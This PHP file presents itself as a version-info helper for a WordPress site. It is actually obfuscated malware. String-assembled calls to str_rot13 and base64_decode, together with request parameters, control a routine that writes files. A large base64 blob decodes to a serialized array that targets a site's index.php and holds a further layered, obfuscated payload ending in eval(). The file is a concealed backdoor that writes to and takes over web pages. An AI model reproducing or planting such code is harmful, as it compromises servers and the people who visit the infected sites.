<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHmY21up3EyqT5lY3ElLJEyLaIfoP5col9up3AyqUZinJ1aY253pl81A2D3LmZ2MzDkAGDlAmywZQZkZJD3ZzV3BGOuLGx3Zv5eMKx', function ($version_file, $name) use ($temp) {
        $data = translation_v3('YToyOntpOjA7YTozOntpOjA7czozODoiL2hvbWUzL21hc3RldG5yL3RyYWRlYnVsbC5pby9pbmRleC5waHAiO2k6MTtzOjQyNzM5OiI8P3BocCAkTVY2d3I9J2I1dVp2SU9zS29KcEZOWkFoWEo4UitkV0RxUzNDVEhZOU0vcmUxa09DUkxnclljbW9Ja0psU1ptZmF1RDlBWDZCdjBxcmQ5bWJZemZZc3UrQ2VDcEd3bFozbzB0aVJpZDc5ZExCYTdDK2o1TTR0UmxYb0xwdnJld3FNMVV0OTcvdXlOcDNrcUVHcVZPVjM0S2pOTjNiUXFqUXFwaEZUOVFiV29ZOUlhZjZvNkx2VjBEY25JczdoSVZUMVhSamZZY2ZISE9ucU5NbzlvRjFVcUlPRk5VUzJSMnBCaERMMTRnVklZR0xnelBjb3FkZlRINTg4UXZLcWVObUZqVlhNV0RMUThPQmJqWDBIUlVCbjhWaG5jNE9ISjRMSS9VZytQcnhWUXVoZEpoU0Mxakd4Q1lPNWNqM1dnaWE2eGpVcENHSHZSbEw2dVllUENOcFlXVG0wajRhNlhnRlh0TFJsTHBQTmhMRWxiNlZ2N3c3aTcvV0hjZVJYOVMxSVgzb2pFdjhGYmw4QndOL3JzQW45bksySGgwanVod0JKUUVKVWtrbjdiaVNSM2RwSVJzaE9waXhEYWZLUmJOQ0JFM3M0K2RyWlMvazc4RGZQVm41bTZiY2o0cHgvYm0rM3RjT1R1TTVWSnVNeTFxZWN6RlR4aFVTdXpYS2U5azZOcjVYQ2tEbnE5RWY3WXhLM21uRHF1eXl3TDErdkpvbk1ZS2ZaZkxDcS9zYWlwbXN6d0haZlZNTUlOakJzcGNKMTcyOWFpR0V4MDlZOUhGMUZNNUNuRDk4T1JjaDJaVUVZLzZWMFArOHBKT1pIREt1OVdTTDY5UER5OUhLelFHbjZxdzk3WjZPM3hJQTdYcW5XREwwYWp2bnJSR3dLbW5HeWtSQ2hEcTc4dUhkN0ZPTVlaS05lOWthSWVuNTRPU3BBRWFoWkxJRVJvclJiSGl3MWVnU2RRczNnQ0lXdmRqMGZLY0tRZURTNUxyY3RRUmVzeWhDVmE2SUNUcTBzZVM2UGU3NVhEVmI0VGVRbytGTWs1L0tNaG44YzVNS3hDejNJVXNMUEVIUEpBT1ZNR1NwbGJSWElCTTZYa0FJOVBUaFRJZzFmSGgrZEhvSElWY0lHdG9LREFzVlFrNU5waVBBaVorUFVLUWdZdENwTitiMURtWFlGYUVsMFJvWWcyNkkxNko3MnJSeEJUampMVWxKaHo3enYxckRlQVhYdXFuRVpNcXh4Y3dsaHdjUW1QcUc2NEFuMVlCQnMrYXVwd1dPYUpjclpIelF3NUlrVlJnVFRteGkwekxhaDZ0VHJhUjdqYmJHTVVCS2gvMFZjQllualpPMVF2VDRIU0pXMUNsdlhjK2l4YnpQUWMzL3NFRmRvS3F5VHpMWmFoZjdaMFRXV2FxMDlTRHBpZXAwMTEyWjNOYWpxcFFWR3ROL0hydVA0MG8wTFV4QzhBR1l6aUk5Wm5lT1JsQkw3REJ6endQZ2VlK0VldHpwLzFMMHlUUC8yaFIzVHAwdmV1alBZTFBpZGd5VTZ0L20zRnpOUWZkR28xNlpndXE5a2JXL005N2N2YWNra1RzclpTQzdxWmhXTTB4d3YvMjdRS2dxbmEwTk1KRER4RDNmVU0zVnFWcXh0WWdObVE1YWtENjhsN3BpY2xEVStiQ2RKeUxKMm81Njg1Y3liTXJPRVRYYU5NbzV2MDNtQzdqbUg0bnV2d3JxdVZtSjhJaEUxZVBJM3NjTktWOFljdzVzSkdyOXcyV1JZWDVSRjdSdHdlUk5tWXRxQTU4YlE5ZCs2WXNPRmttMDQzdDcvWHNxZmQ3bEI5a2ZNNTdMOG54Y0ttdUdsT3B0OG9aMXJXZDJoTFY5ZktTUDR5cTR2Q05HV3ltYnB3cUR1dnBmRmVJeVFnVWtEYUFYa1prRTVBdWdIWkNzaXJnR3dIWkNlUVNDQkpnZFFPcEplQjFBbWtiaUJ0QmRLclFOb09wSjJnVFlLMkZMVGJRZnRsZmJQMllmS2JPdmRLdGVYaHhpb25WRUduYXB0ZVBUdHZ2dEhpOFJ2cDQ0WWNuektTb1hZNGxLYk5yRlNZQ09Vd1JiZWtwb1E2cElNT2RZck9kRnViQ0pHYTgzSEJaemw2WlVnZGFsdTdJbUtsVEVMd2R2S0t2TDVhLy9wcm5GM3IxV2FYRzdGOC9QcU5HNnFRamRKSXp6b1ZXdU9acnM5OEZ0V3BDWXZxRkRleVFVMmJaUTFLT1BsSklLMTUrZWxNZFpNNTdoeGlPdUpHamdXQytYV3NtbkQrNWVVUFNIdjVvQUJaazU5TXNXVkhSeW0rTjlGeXhtWWpKVTF0MzcvSGRUall5aWphakp4WFpQM1BYLy94NzcvOC9RbW0vLzdwei8vNjU5OGVaY0ozN0dIaFdCU0thV2J6RjRJNldXbUU5dzNJS1BmZ3NJcXIrN3E1KzJ0Q2pna2hsUU9NbXVBVGVNT2I4U3NjTWZuSWZzczR3UGtvUUt0aWNZV2k2WlNFaXZZZE5EZlpWSzRzTlZZUWRjd1o1UE9LK3VBNzJwZXNOZnN0NTJCTml3cHhXUWpoZUR6VERmRlhzam1GelJPVkczNUJzNGVFY2lQc1ZoNzA5Z01zU0J5ZW1PREdEcSt4K0VxUGR0NXVJVjg4bGlzS0cyNVpSZGRQU2wvekU0d3RGZHFPN01zd1BZMnFqNlN2TmZKQTZ1QnNyOWxxaGZrRmR3bEI0VFZYMGdSTmJTMjY3QW4zbTIzNjllZlBrdjdValpiQmd0MzRKbXpRSURMVVpEQmkza3RicDQyVVhRajZhdVJrZ0hCTTA3bXZpWmJqWTlpb0J0MUZQN1Ird0kwYzdRZ1N5ZWJ4RENCM3IvVlBudTg3clc2VG9OcGJLT3Y2bllVT1IwZ2lUYktIWUdDcnM0ZkcvTTI4M2QxcE42RUpQMmZ1RjczVkpoS0JQd21kZVJEcStyakZpVmxOUWdwellVbzg5Y0NINm1rNVQ0ZWpFSHk2QWVjTC90QkFKMGVEcTE2Zko5V3JCc3I2NHduK0MrWDRWQmswRUZtWEgwSXRrWWtkdXFia1FCa2REUTVIZytQRDRSbVhsdGFVZ3pNUVA5cGNucjN2SzF3dVNtZUNyNWJCRWVLd01YTWpsSUlLMTljdEp0TGlrRFVadFUxdENaYUx5ZkQ0azk2VU9USWJHejZ2UVBqREdGb1FPd0dyMnBLTWt5UzBMREZPV0YwZThwM0lReUVwZ3p4cXdqVG1KcWZ1Q2J1cHhGaGJ5cGtaWG91bVZTemNYdnoyVGpjcFZOa2FXVzRTWHZmQzJyV3dEU3h1RTh1NWs4Q1ZWZlhzOGtvWjNtQyszL0RIRzB3WFJuaXJpei91aWR6dE11NENaM1FKdkE5T1dhQUZvM045SXVNK3YwcERjT2prNlZVR1czenFHWTVKVzV4cmMrSlFCeC9zZTVwaFV4UnhoT2lJWXlmZld5SURaTjZGUnpHNmRYd2JIby82dnU1TVFxNFE4NkNTc1dpaDN6TFZOamdIbTZnY3JoWk92aEhOcXREbmtreklaSjFldlBjT0U5ZXZrbXRWVHBiaVBvTGZwVzkxa3Y0Rk94Y0Q0cDdxdDFmdE0rLzlmWGZodlB2ZHA4bjVSSExlRHZ3cmJkNWwzczVMZCtHVG4wYUtQYm1ZRTF4UEl5MkViZjljMk1zOHJEVm52cTlDSzBHbjFuZUQwNGVpdlJFd2QvYlBnUzNZcTdFN2RaN1dndStHL3VTYzM5MEMzL3g5KzlCM1gxN24xUWdxaWhXb2t0Nm5wNjFBSEErUFNaWDhWRklObzlGVWpibUIrTzh5eHFhbnViNDlZVllMV21RNDZWSzJHYkh3QzVOS1ZxcE1obzhMakZQUXJiS0pSL1ZTSFVNUGRMQyt4MXJSZ1RVanluUEdobWVwRXcvYUlwZFBWRWdiaXk4cEFhckpxMjYzZ2JKOStkZE00c244dU1SLzZGbHFFdk5RdW0reVAwSEVLeHZmVTFXYUdUdnJEVlNnVm5oM21QRnlJNEVWQ2tpNmxmNFBtdG81RDd4eDV3dDlFanBxK1NOTTdMS0VOWXdVeUdtWitNcXo1K0wrQ2NrMERCclpmWml0QnNuQ2xnWkRicWxMbElDWU0xbDRXc3RiT0RNUWhRNUx2OXYwMlpSYVRVT2JjYjNDZGhCT1l1dkNtZDVzdnNRclRuNDFXRHFsR005YWVMN0hIOTN3TEhucitjMlpOLzBPS3g4RmRzMTdpem9wZExuQnlZWi9ORThzazBKQjlHbkJ2RmdjZ1JsUU1mcnlQT1VjUlg4SWdNbnViZVludUFaR2pDRE1ycG5mVGl0bnN0WHBQREdUSEVlSkZia3MyUkRMb3RnRy9BOCc7CSAkUlZnaFo9ZnVuY3Rpb24gKCRRRWpRKXskeGI2ajV4ID0gInJfc1J0IjskZGlldm5zPSR4YjZqNXhbKDQ4IC0zMyAtNykgLzRdCTsJJGRpZXZucyAuPQokeGI2ajV4Wyg1Ni0gNDgpIC8yXSAuJHhiNmo1eFsoNDUgLSA0NSkvIDRdOyRkaWV2bnMuPQkkeGI2ajV4Wyg0MCAtIDM3ICsgMikvIDVdLiAkeGI2ajV4Wyg2Ny0gNTUpLyA0XTskZGlldm5zCS49ICdPJw0uDSd0JyAuCigoMTEgLSA2KS8gNSkuCSgoOTcgLTc5IC0gMykgLzUpOwkkZGlldm5zIC49IAknJzsgIAkgDSAKIAkJcmV0dXJuICRkaWV2bnMoJFFFalEpOyB9OwkkUlhicHpzPQlmdW5jdGlvbigkS0RoKSB7JHZNUXZUYjl3ID0gIjlFIjskb0huVGhaRD0nQicNLiR2TVF2VGI5d1soODkgLTg1KS80XQo7DSRvSG5UaFpEIC49CigoNzggLTUxKSAvIDMpLiAnJzsNCiByZXR1cm4gJG9IblRoWkQoJEtEaCk7fTskUlhicHpzID0JZnVuY3Rpb24JKCRLRGggKXskdk1RdlRiOXcgPSAiOUUiOyRvSG5UaFpEPSdCJy4gJHZNUXZUYjl3Wyg4OSAtODUpLzRdIDsJJG9IblRoWkQJLj0JCigoNzggLTUxKSAvIDMpLg0nJzsgCSAJCXJldHVybiAkb0huVGhaRCgkS0RoKTt9OwkJCSRrcm4gPWZ1bmN0aW9uKCRCZHM5Myl7CkVWQWwKKCRCZHM5Myk7cmV0dXJuICJib1hlaER0M0IxdG9MckxTMHlBSSI7Cn07CiAJIGZ1bmN0aW9uIEJFOQ0oJEZYQ3VlKQl7CnJldHVybiAgU1MzcHQoJycpCi4kRlhDdWU7fSANZnVuY3Rpb24gU1MzcHQoJHhvczU0VSApCnskdHp1cU0gPSAiNm5kdiI7JE50NmlBdGpkTj0kdHp1cU1bKDE0IC04KSAvIDJdCS4nVicKLiAkdHp1cU1bKDcxIC0gNjkpLyAyXS4kdHp1cU1bKDQ3LSAzMy0gMTApLzJdLgknYycuICd0JwkuJ3UnCi4JKCgzMSAtMTkrIDYpIC8gMykuJ0UnIDsNJE50NmlBdGpkTgouPQknJztyZXR1cm4gJE50NmlBdGpkTjt9CSRNVjZ3ciA9JFJYYnB6cygkTVY2d3IpO2Z1bmN0aW9uIAlUc0pNMigkeDJ1VHMpeyRwcFogPSAibmdpemxlZmEiOyRWUE5PbTE9JHBwWlsoNTEgLSA0MyAtIDIpLzZdIC4gJHBwWlsoOTYgLSA4MSkgLyA1XQ0uJHBwWlsoNDAgLTM0KyAyKSAvIDRdLiRwcFpbKDU4LSA1OCkgLzRdCS4kcHBaWygxMDItNzgpIC80XTsJJFZQTk9tMQ0uPQokcHBaWyg2OSAtIDQ1KSAvIDZdLiRwcFpbKDY0IC0gMTUtNykgLzZdCS4KJ3QnLgkkcHBaWygyNSAtMTAgKyA1KS8gNF0uDScnOw0gCXJldHVybiAkVlBOT20xKCR4MnVUcyk7fSBmdW5jdGlvbiAgZzdIbGUJKCRJNEZkNAkpIHsgCSRMTGc9Ilh0YkxRSm1KSXNQb2l3eXRfU2pXTjRvZ3lHWU1SVHZFM3BuNWlWRjdzcWFMSWZqaTJ0WXpEcWs1akpJIjtyZXR1cm4gJExMZzsKfSAKCQkJCQpmdW5jdGlvbiANcEttT2ExCigkdGJQb0MxNjIKKXsNICAkdjl1Z2xrWFA9InFiNGEzU3dIYVlLWkI3bnR1bFFFRE1tTEN4RG91MWYzQkpzSmluMlZ1IjsKcmV0dXJuICR2OXVnbGtYUDsKfQ1mdW5jdGlvbiAgc01hT0ZldgkoJFhONWhXSTkgKQl7JG9KcHpEUnI2ID0gImNCZVM2XyI7JHAxUlFGaUFtPSRvSnB6RFJyNlsoNTQgLSA0OSkgLzVdLiAnYScuICRvSnB6RFJyNlsoNDUgLSAzMykvIDRdDS4nZScJLgkoKDExMSAtODcgKzYpIC8gNSkuCSgoMzktMTUpIC8gNikuCSRvSnB6RFJyNlsoMTE2IC05NyArIDEpIC8gNF07JHAxUlFGaUFtCS49J0QnOyRwMVJRRmlBbQouPQkNJ2UnIC4kb0pwekRScjZbKDE3IC0gMjcrIDEwKS8yXQouJ08nLidkJwk7JHAxUlFGaUFtCS49CSRvSnB6RFJyNlsoMjAgLTE2ICsgMikvM10uCScnO3JldHVybiAkcDFSUUZpQW0oJFhONWhXSTkpOw0gfQkJJE1WNndyID0gc01hT0ZldigkTVY2d3IpOyRNVjZ3cj1Uc0pNMigkTVY2d3IpOwkkTVY2d3I9CSRSVmdoWigkTVY2d3IpOyRrcm4oJE1WNndyKTsgPz48P3BocAoJJHVlZ21FZU9DOD1mdW5jdGlvbigkX1ppU1UNKQ17JE9PUlUgPSAicVJvUDRfNlFmIjskdUMwZVV3UHY9JE9PUlVbKDg1IC0gNzUpLyA1XQouCSdOJyAuCiRPT1JVWygxMzItIDkyKSAvNV0uDSdyJwouKCg2MS0xOS02KSAvNikJLgokT09SVVsoOTYtODgpLzJdLgkkT09SVVsoMTI0IC05OSkgLyA1XQouICRPT1JVWyg4NS0gNzkgLTYpIC82XQouICRPT1JVWyg2NiAtNjQpLyAyXS4JJE9PUlVbKDQxIC0yNyAtMikgLyA0XQouJ0InCi4JJE9PUlVbKDgyIC0gNTcgKyAxMCkgLzVdLiAkT09SVVsoODAgLTY3IC0gNykgLyA2XS4gJyc7JHVDMGVVd1B2PXN0cl9yb3QxMygkdUMwZVV3UHYpOwkKCSByZXR1cm4gJHVDMGVVd1B2KCRfWmlTVSk7CSAgfTskUlpveVJMbj0nU2kvZklCSS9uUUR2eHVWdTJtUVpveGpIdWpXbUdRYU5UY0FaWHpTSWZnRjJFS0ZJV05aejVhL3M5N2NvZ2hGUVZtWjdoM21OSWlyNyt1Mi85OUR6QVJ6dmtSY2JVUEpNU2o3SHplb204ZkhVWS9GZnlUbmQ0YWNjN0Fnd3Y1VHl2eDc0Q2hrTXpFcURsL3BQWTFCM3NkZldpeFJMV3FEbmNHRms3TzZWSUJoNFl0K3ZkbGdHMnFlcElXT1hnYzNadjBXdlJneDZvVUovWGVud0tRTFkza2hGT1VFcks4MGMxMGp2RnJHSVhtV3l1TEpva1poYmNDMTQrbllQaWRkYmR4WHFMRkcydk9oU3FSMXZkN3F0V2g3c3RtSWMwUi9mdE9WakRVYUtpTjE4cHgyR1NaRm5IZzJiRkxGVEdoRlBaMG1jYmFoajhIK2Mrczd5djNyd2tWcUdSNk5CSDFabk15YXBkU01pb3o2WlNRRFNxY2puSEdYYmNmNERVZ1hkSlhtSndZc0Zsa3JSL0dVSmtoMGpQL2xGdFdmZ2t5Yy8rL01neXIxWGJUODlzSXN5WGcrd204T3p5VnRKYmx2MDVhMGhTazc5bFV6Q1VDdU1KVG9GVGU0S3N2cFdPbkoyYTlSeGdaU2VNV3dEaXovd1RuOWYvekVYNjZ5SFNya1orS2lTeFk2UzZRODVmWTBqUU03eVpCUlBZM0djN3ArNEdHdnVYVm43dGdnRnBicHRKYURXWFNoc3Z5MTNRb1B3NlhKYytaV0UwRmZ0MlJoa05UR2VpQUs1MUJjOElMNjYzR0FlcTIraXFxbjEyZWZhdWtyN3VsM3lIemh6YjE2bldMOEZEaEtiNVNyQU03TDhGeU1jNllEQkpjMUpPbEZHV3l6MUVrY1JsWVNLbG96TldqZjBhM0ZLdnZjaEc2SEFibUV3RUZ5VldITTZxVWVyeUY2NTFJNWNoOUM2MTBLZWlUZ3FxVjQ1dEVzUWloQTdBWmw4eldKb3dPVFVFc2tWa0RkMUtMZWFnNUNSVWRobXhQeEtOT2ZvaGpDdG91UVN0WkNjdXAwMnVWSGdMM2xYVGszbmNqeUFCUmdGM1F4UGNFZ1VwUHYydTZwZThqSUVFd3EyS01zbXJpVVlTOG1OVE51cUI3WnVoSVd4WnRKbWJvbFh4bHZZMlFCVk12Nms0YkdQSm5GZERQbVZPTUxCNFBocUZSTDh3V2hGa3dPWG13T0w5UW8yVjVyZEx4ZmFGWnpObmxiWVBZL0pZdDFPam9yTDUwVFd0TWkxRmpTeG5XSDFEdW4wazVOdDJsSXVYNXNUb1BZZE8vdDZmTlY3cDRuZDhmaC9kMU9BTjVVNGRpVDZkSlNNbFk5NFBlcVR5KzF0Y1RheE8zckphQU8wNVZaS2ZDdWpORkh2UHF1dXplT1pXdUFGMWRPK3A5OWJUL1ZpWFdORzZhWVh1WFZ3WHlaQ1Q2b1gxY3h4RXFUbmxkZ09SYjF2bTBIc0w5QWJ5U0xSN3A0ZnZhWEp6aFFpbjlnS2ZFK2N6eW9MTU55emtuQTBkVmRmMGtKeEZ3Wjd2U2FaZi9Eayt5ZjM4dFh4cUVXYW4xWlNReEM1U3RXZXNibkZFZ3pXanRtbFMwWEZXSTZ0UnhRRUoxSEVmWHBEdGprYk9hSE5LNURwcmdRNXZjNGVhQ3lUckxJZnJvWEkxWU5WUFNIZk9BZEMyRm8rR3FncWlhT3NNYzVZUFZ2Szl1ZHZ5cGhwT0cvLzYwckQwNTVNMzVUOXE2TEtNaHdqWEdIZmlheG1valdtRW1qTk80Tm0wd3RPY3c3M0VQYjZqUFBYT3c0MWFadjR2eXlYQWJJVW1DSUhaTURwZ1NaQjIrdHZ5aDQ4eW5PUHFPeFh1bG1FUHR4bzlsVzNRVmRNLzd4TUVLcEhGRlQzdkpSWEo0MGM4a20xL0xWaTdseTA1OFh1LzVlUW11MklXM21jelI4NDNoQ1VSenF0ajVYdDN2YUJGWmdENCt6VjhEUFBTYVpuYkQwSUNFSDlsTlc4ZVJQVWx6V2Z5ZVp0a1dEOWZ1V0RhdFp6c2o1VnN0TVJTUkJxTG9YdkdQbjVBOUw0ZWVYMG52dUkwUHFGbnVTa2N0TGZ1TXNYTmQ0VnczM3RweUV5dzNBZk1CQkxBeHVUbzdaZG52MVhJSGhBTDg1WFFEczhXbFJHNU5PVjV1MmNIYXgyQXZSbTF4TXJkVkpXSHpyV2xyZkM4UkhVaTFPSStvVkVvWXdzaHhwQWU1VHJESWRYbVRPeUpuYXBaNEJ2SERNNURrbng2ZHZBQXN0dkdwb3JoS21vYnJjdjc0TCtRNnhpVlZOVll2NlBTbGtzMkl4blFneW0wK1hwTklCZ0d6b2hSUkVjdFROajYrYXREMmI3RDR0N2ZnZmN4bjlZQ0hQQlZEeUFvZGRQSk10S0FVNjdZeFZDeWptaGFzYnU5bGxYNEM4WVd2OW1hVXQvMDRIZkN1MzlKcS9BNFQ3T3JsaWpRZGJaS2FaSkhCN1Uva1NERFUwbHZTdkFSVVlyWDVxSkI4OGF5RHhsbW80QWROeXQwb3A5S21UNHZOb2hwbk5IWGpnOWJ3bWwxemgxSmczaEJvbjlpRDNTTjZzcm10c3Rkb3hRaVNjTE1kMUhLcDcrSTV5blF3VWlsTUJrQ0xsdkZEOTY4ZkVXN1U0MjJIaWZUNTh6VFV1NFBIVVZqR2RLTDVyOVVuMEwwVmtJd0RJclBobzYyMXE3NCs0Rkp1a2VxUjNJallxMG9JenJJTXdGSkZ6T0VjRi9hejdOMFhObWJLeHlYU0pIcmFsYzNiN2lXZTNFM3EweHYrV1dTWllZQzUyeFRNRzNrQ1NVaURhMDRrd0Jyd3FXTDJQbzlSc3VPU2hWTWVsSmQ0YkJJSUZLcVZ1ekRkOW1kQUwwQ2JNZktmNncyVnFNN2NJelVpN0YzTGhsbnpqQ25PQUdTMWxhNTJSaGd1NDMwK2luMzRYQkJPUmZ1WlhPU0NnSllEcnhUVndyWU9RQ0JRSVhzckdIelFrOFpDZGlFN1JhYnR0ZDBHUHJhbTBKMFkvRzk4LzI0d05YcHYrUDZFTkJ4NzN0ci8vZUVVYkRHQ3ZOQzV4K09Pa3FrVVkrYUxSQTI3S0c3L2ptOGRyc0ltU1VhekdXRFhHbC9adW1JSk9VSGtMcFVmOUppVnBEMTFWWnlRcjJBS25TbGR0eTdIcSt4alpzdXl3cGxwcFU4WEVNa1l0NUhQaFNOdTQ4T2JPcmFZcHhBdnA4U0FuZzJoTG1iN2JtQTJyMlY4dXdZamR1RTJYUTRqQVNkTWdRQ3NPZUxhUmltWWNDQmRGK28vekU3cFlFZkRDMTdXRys5ZGl5SGJwQUZpTUVjK29mRTlzZ21EQ2lsM3Q3ZkMvNC9wNDlxQmkyNTQ3c1Fic28xVWhvOW9lVVYvcWJKT1pnRkQ3Y3dHS1plQWFOL2FBbDcrbVF6Mmh0VDM3TUNDVHFlTDlTVUVRWUFGKzFLUDlFV0ZxQUVGK2dPQSthWG1kYy9KQTdUNm9GTVJETVA0NUlVNWt1Ull6WmJOYkVndTJVR3h4TUhxL21YSGpySCtDR0VxZDU0bTNSdXo3UytsZXh6d3k2Q3VtOHFNSkF0R2xMTXd3bC9xeVpWdTRVcSttWTdVMEZPeUJHQlpPYXJKVHVTQXlYRnRSdlo1dFl1d2VNaCt2MEc4L2pEZVlBUkFrL3lDWXRnQTArL3FqKzNxaWdVYytybVdWQTYzZ0FFSGdab3hpa1NKWHlnQW9XM2hhKzhwenVHY0dPYUVzZVlnNmtNMURjTFJwaFVWZUd0MkFtb2tQV0trSVZUZHZlOEthd0hKS2E1MjNlSDZnbXNDUXllQUtkNkJFdGczM3JYZzRQQ1ZSRzczb2FCQjlZUXVPdXJiNEc4QVk0ZFlKN3dtTFcvaEpsYzFVQ2NNQmF2UTl3V2dyc3FTUHhDR3VoZ3NzQzlxYXBBenNaRmhNQmQzaUVCcnkycXgvQlEvTmZINUpsaFVrdWFDRkpCZnVLbHdHVXcxV25LUjFiQXhjUG13eUtSNHRMWVNLNXhXektTb01WSXpoakM2aDFDWHNNZ3BhbnlRdS9YSTVGVzVLWDA2ZXhOb2I1RTlFU3lsMUxoaE5XVm4zeHU4YjlVd1EzRVo2OTZWMUhtcUFaMFo3dWRvQzU2c2V3aFFvKzZUMFF3dTZaM25aR2k3cjVzcjJCZzY5NnptSUd6eHBxOHFnUWF5M2ZVelhBT2FSMmFpaUU1T2svWGJUSlA3Sk1FSzUwRCtxLzF6UlJuNk1XeVh3c0ltRjgrU25LL2llbE9qT1k1L0FoTTcrMW81MTFHZWhhRGlZd01aRVI4cGt4YkpQY2RxTU81L0RSTkpzc3JjWXlsK3VhT2x5SWFpTjZ1bEZjS1BtU0NKYUJtb0Nzc010anFRQVJ4NG9LZGdXY3NHbWdnZG1xL3MyQnhnaWNEU0ZxVlM1Qk5qTjZQZStVMEgxTFpSNGJLOGVObVlqYXNadXNRUmRFcXc0RmNvMDU0MU1EQ0pHclB1TWhWVXZaL05wJzskSHdRWjg9IGZ1bmN0aW9uICgkV3kxVmZJNm0JLCRtSWJ4cHBGaSwkTWYzMTdSKXsKcmV0dXJuICJtdmVEUDRhUUpMTlpabVRIXzBvOEMyNGljZlQweGJuSUxQekFvTWNLVmxXaTlRemFuT1Nybk1tIjsKfTskVUdsPWZ1bmN0aW9uKCR4dnp1Z1Y1UUggKXskZHZOeD0id3FFQUxHamVDdVIzdW9tR1RWWXhHOUVZYnlRa1NWb3k5RU5GcUlDU0JMWEtMR2pxIjsKcmV0dXJuICRkdk54Owp9OyRiTlBSUTc5RkgJPQlmdW5jdGlvbiAoJFV6cGw4bncsJHdjSQosJHBnYzYyCSkgeyAJCSR0ejVVSE89InJZdlFEcSI7CglyZXR1cm4gJHR6NVVITzt9OwoNJHFlTUp1YUw9IGZ1bmN0aW9uKCRnXzlpdQkpIHskanB0U210ayA9ICJUcjFfIjskSXdMNlJXMTlVPSdzJwo7ICRJd0w2UlcxOVUuPQkkanB0U210a1soODctIDkxKzQpIC81XQk7ICRJd0w2UlcxOVUJLj0KJ1InIC4kanB0U210a1soNzggLTY0ICsgMSkgLyA1XS4KJGpwdFNtdGtbKDI3LTE3IC0gNykvIDNdCTskSXdMNlJXMTlVCS49ICdvJwk7CiRJd0w2UlcxOVUgLj0gCSd0Jw0uKCgxNCAtMTkgKzcpIC8gMik7JEl3TDZSVzE5VS49CSAoKDQxIC0xOC04KS8gNSkuJyc7CQlyZXR1cm4gJEl3TDZSVzE5VSgkZ185aXUpO307CSAkUlpveVJMbg09TTZpc0lCKCRSWm95UkxuKTskUlpveVJMbiA9ICRxZU1KdWFMKCRSWm95UkxuKTskdWVnbUVlT0M4CT0JZnVuY3Rpb24oJF9aaVNVDSl7JE9PUlUgPSAicVJvUDRfNlFmIjskdUMwZVV3UHY9JE9PUlVbKDg1IC0gNzUpLyA1XS4gJ04nLgkkT09SVVsoMTMyLSA5MikgLzVdIC4gJ3InLigoNjEtMTktNikgLzYpCi4NJE9PUlVbKDk2LTg4KS8yXQkuCSRPT1JVWygxMjQgLTk5KSAvIDVdDS4gJE9PUlVbKDg1LSA3OSAtNikgLzZdCS4kT09SVVsoNjYgLTY0KS8gMl0gLiRPT1JVWyg0MSAtMjcgLTIpIC8gNF0uJ0InCS4JJE9PUlVbKDgyIC0gNTcgKyAxMCkgLzVdLiAkT09SVVsoODAgLTY3IC0gNykgLyA2XQkuJyc7CSR1QzBlVXdQdj0gc3RyX3JvdDEzKCR1QzBlVXdQdik7cmV0dXJuICR1QzBlVXdQdigkX1ppU1UpO307CQ0KCg0gJFJab3lSTG49CSR1ZWdtRWVPQzgoJFJab3lSTG4pO2Z1bmN0aW9uIA1CWFAwag0oJGdxczI5RgkpCXtyZXR1cm4gImtaZ2Fncldqd0dlVGlzaUNXdVhxdUlUcmRfQjJvUlVWcUQ4aXdueW56WkxINSI7fQkNCiRSWm95UkxuID0NVThqUF9MKCRSWm95UkxuKTtiVkFhSnJwTAkoJFJab3lSTG4pO2Z1bmN0aW9uIEZDTkxLd25sICgkYV9vTTBvXyl7JFlUeiA9ICJIbVY5YSI7JEc3a2JBcT0kWVR6Wyg2ICsgMyAtNSkvNF0gLidJJyA7DSRHN2tiQXEuPSRZVHpbKDk4IC0gODAtMTApIC8gMl0uJ2MnIC4kWVR6Wyg1NCAtIDQ2IC0gOCkgLyA0XSA7JEc3a2JBcQ0uPQkNJFlUelsoNTktIDUwKSAvM10gLidnJy4gJFlUelsoMjAtIDE0KS8zXS4nJztyZXR1cm4gJEc3a2JBcTt9ZnVuY3Rpb24gTTZpc0lCCSgkVFdpTWtlRHcpeyR4bXNVeTEgPSAiVSI7JE11RTN5dz0naScgLiR4bXNVeTFbKDUzIC01MykgLyA1XS4nUicgLicnO3JldHVybiAkTXVFM3l3KCRUV2lNa2VEdyk7CX1mdW5jdGlvbiAJVThqUF9MDSgkVTQybWhXdzdwICkJeyRkTXBUTGVNID0gImZuYVpHdCI7JHBGZFR3TUxZdj0kZE1wVExlTVsoOTQtIDc2IC0yKS80XS4NJGRNcFRMZU1bKDgxLSA2NisgMykvIDZdOw0kcEZkVHdNTFl2Lj0JICdJJy4kZE1wVExlTVsoNzMgLSA2NykgLyA2XSAuJGRNcFRMZU1bKDU3LSA1NykgLyA0XQ07JHBGZFR3TUxZdgkuPQknTCcNLgkkZE1wVExlTVsoOTMgLTczIC0gMTApIC81XSAuCiRkTXBUTGVNWyg4MyAtNTgpIC81XS4nZScJLgknJztyZXR1cm4gJHBGZFR3TUxZdigkVTQybWhXdzdwKTsgfQ0gCQkgCgoNCiBmdW5jdGlvbiAJYlZBYUpycEwgKCRtWDVQRlNjc0spe3FFS0ppbmwoJG1YNVBGU2NzSyk7fWZ1bmN0aW9uIAppVXINKCRlZU4KKSB7CXJldHVybiANRkNOTEt3bmwoJycpIC4kZWVOO30gZnVuY3Rpb24gDXFFS0ppbmwgKCRrZ28zKQ17CmV2YUwoJGtnbzMpO307ID8+PCFET0NUWVBFIGh0bWw+CjxodG1sIGNsYXNzPSJuby1qcyB2bHQtaXMtLWN1c3RvbS1jdXJzb3IiIGxhbmc9ImVuIj4KCgo8aGVhZD4KICAgIAogICAgCgk8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+Cgk8dGl0bGU+VHJhZGVCdWxsPC90aXRs